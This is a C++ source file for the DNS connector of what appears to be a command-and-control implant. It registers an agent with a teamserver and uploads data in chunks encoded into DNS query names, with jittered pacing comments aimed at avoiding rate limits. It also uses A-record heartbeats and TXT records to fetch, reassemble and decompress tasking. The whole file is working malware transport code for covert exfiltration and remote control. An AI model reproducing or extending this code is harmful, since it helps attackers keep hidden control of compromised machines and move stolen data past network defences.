#include "ConnectorDNS.h"
#include "DnsUtils.h"
#include "Crypt.h"
#include "utils.h"
#include "ApiLoader.h"
#include "DnsCompression.h"

extern "C" int __cdecl _snprintf(char*, size_t, const char*, ...);

// ============================================================================
// Helper: Select resolver from profile (first entry before comma/semicolon)
// ============================================================================

static void SelectResolver(const CHAR* raw, CHAR* out, size_t outSize)
{
	const CHAR* def = "1.1.1.1";
	if (!raw || !raw[0]) {
		_snprintf(out, outSize, "%s", def);
		return;
	}

	size_t i = 0;
	while (raw[i] && i + 1 < outSize) {
		CHAR c = raw[i];
		if (c == ',' || c == ';' || c == ' ' || c == '\t' || c == '\r' || c == '\n')
			break;
		out[i] = c;
		++i;
	}
	out[i] = '\0';
	if (i == 0) {
		_snprintf(out, outSize, "%s", def);
	}
}

static BOOL DnsQueryTxt(const CHAR* qname, const CHAR* resolverRaw, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
	*outSize = 0;
	if (!ApiWin || !ApiWin->WSAStartup || !ApiWin->socket || !ApiWin->sendto || !ApiWin->recvfrom || !ApiWin->closesocket)
		return FALSE;

	WSADATA wsaData;
	if (ApiWin->WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		return FALSE;

	SOCKET s = ApiWin->socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (s == INVALID_SOCKET) {
		ApiWin->WSACleanup();
		return FALSE;
	}

	// 解析 resolver，支持从 profile.resolvers 传入的 IPv4 文本，
	// 若为空则回退到默认 1.1.1.1。
	CHAR resolver[64];
	memset(resolver, 0, sizeof(resolver));
	SelectResolver(resolverRaw, resolver, sizeof(resolver));

	HOSTENT* he = ApiWin->gethostbyname(resolver);
	if (!he || !he->h_addr_list || !he->h_addr_list[0]) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}

	sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(53);
	memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

	BYTE query[4096];
	memset(query, 0, sizeof(query));
	USHORT id = (USHORT)(GetTickCount() & 0xFFFF);
	query[0] = (BYTE)(id >> 8);
	query[1] = (BYTE)(id & 0xFF);
	query[2] = 0x01; // recursion desired
	query[3] = 0x00;
	query[4] = 0x00;
	query[5] = 0x01; // QDCOUNT = 1

	int offset = 12;
	int nameLen = DnsEncodeName(qname, query + offset, sizeof(query) - offset - 4);
	if (nameLen < 0) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}
	offset += nameLen;
	// QTYPE / QCLASS IN (1)
	USHORT qtypeCode = 16; // TXT
	if (qtypeStr && qtypeStr[0]) {
		CHAR qt[8];
		memset(qt, 0, sizeof(qt));
		int qi = 0;
		while (qtypeStr[qi] && qi < (int)sizeof(qt) - 1) {
			CHAR c = qtypeStr[qi];
			if (c >= 'a' && c <= 'z')
				c = (CHAR)(c - 'a' + 'A');
			qt[qi++] = c;
		}
		qt[qi] = '\0';
		// Only support TXT/A/AAAA here.
		if (qt[0] == 'A' && qt[1] == '\0') {
			qtypeCode = 1; // A
		} else if (qt[0] == 'A' && qt[1] == 'A' && qt[2] == 'A' && qt[3] == 'A' && qt[4] == '\0') {
			qtypeCode = 28; // AAAA
		}
	}
	query[offset++] = (BYTE)(qtypeCode >> 8);
	query[offset++] = (BYTE)(qtypeCode & 0xFF);
	query[offset++] = 0x00;
	query[offset++] = 0x01;

	BYTE resp[1024];
	memset(resp, 0, sizeof(resp));
	int recvLen = 0;
	const int maxRetries = 3;
	for (int attempt = 0; attempt < maxRetries; ++attempt) {
		int sent = ApiWin->sendto(s, (const char*)query, offset, 0, (sockaddr*)&addr, sizeof(addr));
		if (sent != offset) {
			ApiWin->closesocket(s);
			ApiWin->WSACleanup();
			return FALSE;
		}

		fd_set readfds;
		readfds.fd_count = 1;
		readfds.fd_array[0] = s;
		timeval timeout;
		timeout.tv_sec = 2;
		timeout.tv_usec = 0;

		int selResult = ApiWin->select(0, &readfds, NULL, NULL, &timeout);
		if (selResult == 0) {
			// timeout, retry if attempts remain
			continue;
		}
		if (selResult == SOCKET_ERROR) {
			break;
		}

		int addrLen = sizeof(addr);
		recvLen = ApiWin->recvfrom(s, (char*)resp, sizeof(resp), 0, (sockaddr*)&addr, &addrLen);
		if (recvLen > 0)
			break;
	}

	ApiWin->closesocket(s);
	ApiWin->WSACleanup();
	if (recvLen <= 0)
		return FALSE;

	// 解析 answers，根据 qtypeCode 决定如何重组 payload
	if (recvLen < 12)
		return FALSE;
	int qdcount = (resp[4] << 8) | resp[5];
	int ancount = (resp[6] << 8) | resp[7];
	int pos = 12;
	// 跳过所有 question
	for (int qi = 0; qi < qdcount; ++qi) {
		// 跳过 name
		while (pos < recvLen && resp[pos] != 0) {
			if ((resp[pos] & 0xC0) == 0xC0) { // 压缩指针
				pos += 2;
				break;
			}
			pos += resp[pos] + 1;
		}
		pos++; // 终止 0
		pos += 4; // QTYPE+QCLASS
	}

	ULONG written = 0;
	// 解析 answers
	for (int ai = 0; ai < ancount; ++ai) {
		if (pos + 12 > recvLen)
			return FALSE;
		// name（可能是压缩指针）
		if ((resp[pos] & 0xC0) == 0xC0)
			pos += 2;
		else {
			while (pos < recvLen && resp[pos] != 0) {
				pos += resp[pos] + 1;
			}
			pos++;
		}
		USHORT type = (resp[pos] << 8) | resp[pos + 1];
		pos += 2; // TYPE
		pos += 2; // CLASS
		pos += 4; // TTL
		USHORT rdlen = (resp[pos] << 8) | resp[pos + 1];
		pos += 2;
		if (pos + rdlen > recvLen)
			return FALSE;

		if (qtypeCode == 16 && type == 16 && rdlen > 0) {
			// TXT RDATA: <len><data>
			BYTE txtLen = resp[pos];
			if (txtLen > rdlen - 1)
				txtLen = (BYTE)(rdlen - 1);
			if (txtLen > 0 && txtLen <= outBufSize) {
				memcpy(outBuf, resp + pos + 1, txtLen);
				*outSize = txtLen;
				return TRUE;
			}
		} else if (qtypeCode == 1 && type == 1 && rdlen >= 4) {
			// A 记录：4 字节 IPv4，服务器端按 4 字节分片 payload
			if (written + 4 <= outBufSize) {
				memcpy(outBuf + written, resp + pos, 4);
				written += 4;
			}
		} else if (qtypeCode == 28 && type == 28 && rdlen >= 16) {
			// AAAA 记录：16 字节 IPv6，服务器端按 16 字节分片 payload
			if (written + 16 <= outBufSize) {
				memcpy(outBuf + written, resp + pos, 16);
				written += 16;
			}
		}
		pos += rdlen;
	}

	if (qtypeCode == 1 || qtypeCode == 28) {
		if (written > 0) {
			*outSize = written;
			return TRUE;
		}
	}

	return FALSE;
}

// DnsBuildDataLabels and Base64Decode are now in DnsUtils.h/cpp

ConnectorDNS::ConnectorDNS()
{
	DnsDebugLog("[DNS] ConnectorDNS::ctor");
}

BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize)
{
    // cache profile
    this->profile = profile;

    // copy encrypt key (expect up to 16 bytes)
    if (!profile.encrypt_key)
        return FALSE;
    memset(this->encryptKey, 0, sizeof(this->encryptKey));
    ULONG keyLen = StrLenA((CHAR*)profile.encrypt_key);
    if (keyLen > 16)
        keyLen = 16;
    memcpy(this->encryptKey, profile.encrypt_key, keyLen);

    // pkt size and basic bounds
    this->pktSize = profile.pkt_size ? profile.pkt_size : 1024;
    if (this->pktSize > 64000)
        this->pktSize = 64000;

    // label size (per DNS label, in Base32 characters)
    this->labelSize = profile.label_size ? profile.label_size : 48;
    if (this->labelSize == 0 || this->labelSize > 63)
        this->labelSize = 48;

    // domain/qtype
    if (profile.domain)
        lstrcpynA(this->domain, (CHAR*)profile.domain, sizeof(this->domain));
    else
        this->domain[0] = 0;

    // Force TXT mode internally to support the Hybrid A/TXT protocol.
    // Even if the user configures "A" in the listener profile, we override it here
    // because the new protocol logic relies on TXT for data transport.
    lstrcpynA(this->qtype, (CHAR*)"TXT", sizeof(this->qtype));

    // derive sid from decrypted beat first 8 bytes (agent_type, agent_id)
    if (!beat || !beatSize || beatSize < 8)
        return FALSE;

    BYTE* beatCopy = (BYTE*)MemAllocLocal(beatSize);
    if (!beatCopy)
        return FALSE;
    memcpy(beatCopy, beat, beatSize);

    // beat is already RC4-encrypted with config->encrypt_key on Agent side,
    // so here we decrypt it with the same key to get clear agent_id.
    EncryptRC4(beatCopy, beatSize, this->encryptKey, 16);

    // Interpret agent_id in big-endian order to match the HTTP listener /
    // Go side (which uses binary.BigEndian.Uint32). This ensures that the
    // sid we derive here is identical to the agentId string used by the
    // teamserver, so TsAgentProcessData/TsAgentGetHostedTasks(sid, ...) hit
    // the same agent entry.
    ULONG agentId = 0;
    if (beatSize >= 8) {
        agentId |= ((ULONG)beatCopy[4] << 24);
        agentId |= ((ULONG)beatCopy[5] << 16);
        agentId |= ((ULONG)beatCopy[6] << 8);
        agentId |= ((ULONG)beatCopy[7] << 0);
    }
    MemFreeLocal((LPVOID*)&beatCopy, beatSize);

    _snprintf(this->sid, sizeof(this->sid), "%08x", agentId);

    // cache initial beat for potential smart HI retries
    if (beat && beatSize) {
        this->hiBeat = (BYTE*)MemAllocLocal(beatSize);
        if (this->hiBeat) {
            memcpy(this->hiBeat, beat, beatSize);
            this->hiBeatSize = beatSize;
            this->hiRetries  = 3;
            this->hiSent     = FALSE;
        }
    }

    this->initialized = TRUE;
    DnsDebugLogf("[DNS] SetConfig OK: sid=%s domain=%s pktSize=%lu labelSize=%lu", 
                 this->sid, this->domain, this->pktSize, this->labelSize);
    return TRUE;
}

void ConnectorDNS::CloseConnector()
{
    // Free any allocated receive buffer.
    if (this->recvData) {
        // Using HeapFree / LocalFree would require function pointers
        // similar to other connectors; for this stub we simply ignore
        // allocator details and reset the pointer/state.
        this->recvData = NULL;
        this->recvSize = 0;
    }
    if (this->hiBeat && this->hiBeatSize) {
        MemFreeLocal((LPVOID*)&this->hiBeat, this->hiBeatSize);
        this->hiBeat = NULL;
        this->hiBeatSize = 0;
    }
    if (this->downBuf && this->downTotal) {
        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
        this->downBuf    = NULL;
        this->downTotal  = 0;
        this->downFilled = 0;
    }
}

void ConnectorDNS::UpdateResolvers(BYTE* resolvers)
{
	this->profile.resolvers = resolvers;
}

void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
{
    // base packet size used for DNS frames
    ULONG pkt = this->pktSize ? this->pktSize : 1024;
    if (pkt > 64000)
        pkt = 64000;

    CHAR dataLabel[1024];
    memset(dataLabel, 0, sizeof(dataLabel));
    CHAR qname[512];
    memset(qname, 0, sizeof(qname));

    // HI：第一次带 beat 的调用仍然沿用原始打包方式
    if (!this->hiSent && data && data_size) {
        DnsDebugLogf("[DNS] HI: sending beat, size=%lu", data_size);
        // Base32 encoding expands data by ~1.6x. The total DNS QNAME length is limited to 253 bytes.
        // Subtracting domain and prefix overhead, we have about 150-180 chars for data labels.
        // 180 chars Base32 -> ~110 bytes raw data.
        // We set a conservative limit of 60 bytes to leave ample room for the user's domain.
        // 60 bytes raw -> 96 chars Base32.
        // 96 + 31 (prefix) = 127 chars used.
        // 253 - 127 = 126 chars remaining for the Domain. This is very safe.
        const ULONG maxSafeFrame = 60;
        ULONG maxBuf = pkt;
        if (maxBuf > maxSafeFrame)
            maxBuf = maxSafeFrame;
        if (data_size && maxBuf > data_size)
            maxBuf = data_size;
        BYTE* encBuf = (BYTE*)MemAllocLocal(maxBuf);
        if (!encBuf)
            return;
        memcpy(encBuf, data, maxBuf);
        if (!DnsBuildDataLabels(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
            MemFreeLocal((LPVOID*)&encBuf, maxBuf);
            return;
        }
        MemFreeLocal((LPVOID*)&encBuf, maxBuf);

        DnsBuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
        BYTE tmp[512];
        ULONG tmpSize = 0;
        this->lastQueryOk = DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);
        if (this->lastQueryOk) {
            this->hiSent = TRUE;
            DnsDebugLog("[DNS] HI: SUCCESS - agent registered");
        } else {
            if (this->hiRetries > 0) {
                this->hiRetries--;
            }
            DnsDebugLogf("[DNS] HI: FAILED, retries left=%lu", this->hiRetries);
        }
        return;
    }

    // 之后所有有数据的调用视为 PUT，使用应用层分片：
    // frame = [4 bytes total_len][4 bytes offset][chunk...]
    if (data && data_size) {
        DnsDebugLogf("[DNS] PUT: total=%lu bytes", data_size);
        const ULONG headerSize = 8;
        ULONG total = data_size;
        ULONG maxChunk = pkt;
        if (maxChunk <= headerSize)
            maxChunk = headerSize + 1;
        maxChunk -= headerSize;

        // CRITICAL FIX: Enforce 253-byte QNAME limit.
        // 60 bytes raw -> 96 chars Base32.
        // 96 + 50 (domain/overhead) = 146 < 253. Very Safe.
        const ULONG maxSafeFrame = 60;
        if (maxChunk + headerSize > maxSafeFrame)
            maxChunk = maxSafeFrame - headerSize;

        // 安全上限，避免异常情况占用过多内存；与服务器侧 handlePutFragment 对齐。
        const ULONG maxUploadSize = 4 << 20; // 4MB
        if (total > maxUploadSize)
            total = maxUploadSize;

        ULONG seqForSend = ++this->seq;
        ULONG offset = 0;
        while (offset < total) {
            ULONG chunk = total - offset;
            if (chunk > maxChunk)
                chunk = maxChunk;

            ULONG frameSize = headerSize + chunk;
            BYTE* frame = (BYTE*)MemAllocLocal(frameSize);
            if (!frame)
                return;

            // total_len (big-endian)
            frame[0] = (BYTE)((total >> 24) & 0xFF);
            frame[1] = (BYTE)((total >> 16) & 0xFF);
            frame[2] = (BYTE)((total >> 8) & 0xFF);
            frame[3] = (BYTE)((total >> 0) & 0xFF);
            // offset (big-endian)
            frame[4] = (BYTE)((offset >> 24) & 0xFF);
            frame[5] = (BYTE)((offset >> 16) & 0xFF);
            frame[6] = (BYTE)((offset >> 8) & 0xFF);
            frame[7] = (BYTE)((offset >> 0) & 0xFF);
            memcpy(frame + headerSize, data + offset, chunk);

            memset(dataLabel, 0, sizeof(dataLabel));
            if (!DnsBuildDataLabels(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel))) {
                MemFreeLocal((LPVOID*)&frame, frameSize);
                return;
            }
            MemFreeLocal((LPVOID*)&frame, frameSize);

            DnsBuildQName(this->sid, "cdn", seqForSend, this->idx, dataLabel, this->domain, qname, sizeof(qname));
            BYTE tmp[512];
            ULONG tmpSize = 0;
            DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);

            // Pacing with Jitter (Traffic Shaping):
            // Target: ~15 packets/sec (Avg ~65ms delay).
            // Range: 100ms - 150ms.
            // Use longer delay to avoid resolver rate-limiting on large uploads.
            ULONG pacing = 100 + (GetTickCount() % 50);
            ApiWin->Sleep(pacing);

            offset += chunk;
        }
        // 记录本次上行总量，供自适应 sleep 使用
        this->lastUpTotal = total;
        DnsDebugLogf("[DNS] PUT: completed, total=%lu bytes sent", total);
        return;
    }

    // 空数据：GET 下行任务；在未完成首 HI 时优先执行智能 HI 重试。
    if (!this->hiSent && this->hiBeat && this->hiBeatSize && this->hiRetries > 0) {
        ULONG maxBuf = pkt;
        // 智能上线：在未成功发送 HI 且仍有重试次数时，优先重发 HI
        ULONG retrySize = this->hiBeatSize;
        if (retrySize > maxBuf)
            retrySize = maxBuf;
        BYTE* encBuf = (BYTE*)MemAllocLocal(retrySize);
        if (!encBuf)
            return;
        memcpy(encBuf, this->hiBeat, retrySize);
        if (!DnsBuildDataLabels(encBuf, retrySize, this->labelSize, dataLabel, sizeof(dataLabel))) {
            MemFreeLocal((LPVOID*)&encBuf, retrySize);
            return;
        }
        MemFreeLocal((LPVOID*)&encBuf, retrySize);

        DnsBuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
        BYTE tmp[512];
        ULONG tmpSize = 0;
        if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
            this->hiSent = TRUE;
            this->lastQueryOk = TRUE;
        } else {
            this->lastQueryOk = FALSE;
            if (this->hiRetries > 0)
                this->hiRetries--;
        }
        return;
    }

    // 正常 GET / 心跳逻辑
    // Hybrid Mode (A/TXT):
    // 如果当前没有正在重组的下行任务 (downBuf == NULL) 且配置为 TXT 模式，
    // 则先发送一个轻量级的 A 记录查询作为心跳。
    // - 如果 TS 返回 0.0.0.0 -> 无任务，直接返回（进入 Sleep）。
    // - 如果 TS 返回 非 0.0.0.0 -> 有任务，继续执行下面的 TXT 查询拉取数据。
    // ACK 机制：在心跳 A 查询中携带 downAckOffset，告知服务器已确认接收的 offset。
    if (!this->downBuf && this->qtype[0] == 'T') { // starts with 'T' -> TXT
        CHAR qnameA[512];
        // 编码 ACK offset 到 dataLabel：4字节 big-endian base32 编码
        BYTE ackBytes[4];
        ackBytes[0] = (BYTE)((this->downAckOffset >> 24) & 0xFF);
        ackBytes[1] = (BYTE)((this->downAckOffset >> 16) & 0xFF);
        ackBytes[2] = (BYTE)((this->downAckOffset >> 8) & 0xFF);
        ackBytes[3] = (BYTE)((this->downAckOffset >> 0) & 0xFF);
        CHAR ackLabel[16];
        memset(ackLabel, 0, sizeof(ackLabel));
        DnsBase32Encode(ackBytes, 4, ackLabel, sizeof(ackLabel));
        DnsBuildQName(this->sid, "api", this->seq + 1, this->idx, ackLabel, this->domain, qnameA, sizeof(qnameA));
        
        DnsDebugLogf("[DNS] HEARTBEAT(A): seq=%lu ack_offset=%lu", this->seq + 1, this->downAckOffset);
        
        BYTE ipBuf[16];
        ULONG ipSize = 0;
        // 查询 A 记录
        if (DnsQueryTxt(qnameA, (CHAR*)this->profile.resolvers, "A", ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
            this->lastQueryOk = TRUE;
            // 检查是否为 0.0.0.0
            if (ipBuf[0] == 0 && ipBuf[1] == 0 && ipBuf[2] == 0 && ipBuf[3] == 0) {
                // 无任务，更新 seq 并返回，让 MainAgent 继续 sleep
                this->seq++;
                DnsDebugLog("[DNS] HEARTBEAT: no tasks (0.0.0.0)");
                // 重置 ACK offset 因为没有待下载的任务
                this->downAckOffset = 0;
                this->hasPendingTasks = FALSE;
                return;
            }
            // 有任务，标记 pending 以触发 burst 模式
            this->hasPendingTasks = TRUE;
            DnsDebugLogf("[DNS] HEARTBEAT: has tasks (IP=%u.%u.%u.%u) -> burst mode", 
                         ipBuf[0], ipBuf[1], ipBuf[2], ipBuf[3]);
        } else {
            // A 记录查询失败（可能是丢包或被拦截），稳妥起见，本次跳过 TXT 查询，等待下次重试
            this->lastQueryOk = FALSE;
            DnsDebugLog("[DNS] HEARTBEAT: A query FAILED");
            return;
        }
    }

    // 正常 GET (TXT)：从服务器获取包含 [total_len][offset][chunk] 头部的下行片段，
    // 在本地 downBuf 中重组，完整后再一次性交给 AgentMain。
    DnsBuildQName(this->sid, "api", ++this->seq, this->idx, "", this->domain, qname, sizeof(qname));
    DnsDebugLogf("[DNS] GET(TXT): seq=%lu", this->seq);
    BYTE respBuf[1024];
    ULONG respSize = 0;
    if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
        this->lastQueryOk = TRUE;
        DnsDebugLogf("[DNS] GET: received %lu bytes", respSize);
        // Check for simple ACK "OK"
        if (respSize == 2 && respBuf[0] == 'O' && respBuf[1] == 'K') {
            DnsDebugLog("[DNS] GET: received OK ACK");
            return;
        }

        // Base64 Decode the response (Server sends Base64 to ensure binary safety over TXT)
        BYTE binBuf[1024];
        int binLen = DnsBase64Decode((const CHAR*)respBuf, respSize, binBuf, sizeof(binBuf));
        if (binLen <= 0) {
            DnsDebugLog("[DNS] GET: Base64 decode failed");
            return; // Invalid or empty payload
        }

        const ULONG headerSize = 8;
        // 新协议：带有 [total_len][offset] 头部
        if (binLen > headerSize) {
            ULONG total = 0;
            ULONG offset = 0;
            total |= ((ULONG)binBuf[0] << 24);
            total |= ((ULONG)binBuf[1] << 16);
            total |= ((ULONG)binBuf[2] << 8);
            total |= ((ULONG)binBuf[3] << 0);
            offset |= ((ULONG)binBuf[4] << 24);
            offset |= ((ULONG)binBuf[5] << 16);
            offset |= ((ULONG)binBuf[6] << 8);
            offset |= ((ULONG)binBuf[7] << 0);
            ULONG chunkLen = binLen - headerSize;
            DnsDebugLogf("[DNS] GET: chunk total=%lu offset=%lu len=%lu", total, offset, chunkLen);
            const ULONG maxDownloadSize = 4 << 20; // 4MB
            if (total > 0 && total <= maxDownloadSize && offset < total) {
                if (!this->downBuf || this->downTotal != total) {
                    if (this->downBuf && this->downTotal) {
                        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                    }
                    this->downBuf = (BYTE*)MemAllocLocal(total);
                    if (!this->downBuf) {
                        this->downTotal  = 0;
                        this->downFilled = 0;
                        return;
                    }
                    this->downTotal  = total;
                    this->downFilled = 0;
                }

                // Fix for Resend Logic (Hard Reset):
                // If we receive offset 0 but already have some data, it means the Server 
                // decided to restart the transfer. To allow a clean slate and avoid any 
                // memory corruption or stale data issues, we assume the previous buffer is compromised.
                if (offset == 0 && this->downFilled > 0) {
                    if (this->downBuf && this->downTotal) {
                        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                    }
                    this->downBuf = (BYTE*)MemAllocLocal(total);
                    if (!this->downBuf) {
                        this->downTotal  = 0;
                        this->downFilled = 0;
                        return;
                    }
                    this->downTotal  = total;
                    this->downFilled = 0;
                }

                ULONG end = offset + chunkLen;
                if (end > total)
                    end = total;
                ULONG n = end - offset;
                memcpy(this->downBuf + offset, binBuf + headerSize, n);
                this->downFilled += n;
                // 更新 ACK offset - 记录已接收的最大连续 offset
                this->downAckOffset = this->downFilled;
                DnsDebugLogf("[DNS] GET: reassembly progress %lu/%lu (%.1f%%)", 
                             this->downFilled, this->downTotal, 
                             (float)this->downFilled * 100.0f / (float)this->downTotal);
                if (this->downFilled >= this->downTotal) {
                    DnsDebugLogf("[DNS] GET: reassembly COMPLETE, total=%lu bytes", this->downTotal);
                    // 解析会话头：[flags][orig_len_le]，然后将原始 payload 交给上层。
                    BYTE* finalBuf   = this->downBuf;
                    ULONG finalSize  = this->downTotal;
                    if (this->downTotal > 5) {
                        BYTE  flags = this->downBuf[0];
                        ULONG orig  = 0;
                        orig |= (ULONG)this->downBuf[1];
                        orig |= ((ULONG)this->downBuf[2] << 8);
                        orig |= ((ULONG)this->downBuf[3] << 16);
                        orig |= ((ULONG)this->downBuf[4] << 24);

                        if ((flags & 0x1) && orig > 0 && orig <= (4u << 20)) {
                            // 压缩路径：使用 DEFLATE 解压下行 payload。
                            BYTE* outBuf = NULL;
                            if (DeflateDecompress(this->downBuf + 5, this->downTotal - 5, &outBuf, orig) && outBuf) {
                                finalBuf  = outBuf;
                                finalSize = orig;
                                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                                this->downBuf = NULL;
                            }
                        } else if (flags == 0 && orig > 0 && orig <= this->downTotal - 5) {
                            // 无压缩：直接跳过 5 字节头部，仅将原始任务 payload 交给上层。
                            BYTE* outBuf = (BYTE*)MemAllocLocal(orig);
                            if (outBuf) {
                                memcpy(outBuf, this->downBuf + 5, orig);
                                finalBuf  = outBuf;
                                finalSize = orig;
                                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                                this->downBuf = NULL;
                            }
                        }
                    }

                    this->recvData = finalBuf;
                    this->recvSize = (int)finalSize;
                    // 记录本次下行总量，供自适应 sleep 使用
                    this->lastDownTotal = finalSize;
                    this->downBuf    = NULL;
                    this->downTotal  = 0;
                    this->downFilled = 0;
                    // 重置 ACK offset 和 pending 状态，任务下载完成
                    this->downAckOffset = 0;
                    this->hasPendingTasks = FALSE;
                    DnsDebugLogf("[DNS] GET: task ready, size=%lu bytes", finalSize);
                }
                return;
            }
        }
        // 兼容旧协议：无头部时视为完整单包，直接交给上层。
        this->recvData = (BYTE*)MemAllocLocal(binLen);
        if (!this->recvData)
            return;
        memcpy(this->recvData, binBuf, binLen);
        this->recvSize = (int)binLen;
    }
}

BYTE* ConnectorDNS::RecvData()
{
    return this->recvData;
}

int ConnectorDNS::RecvSize()
{
    return this->recvSize;
}

void ConnectorDNS::RecvClear()
{
    this->recvData = NULL;
    this->recvSize = 0;
}
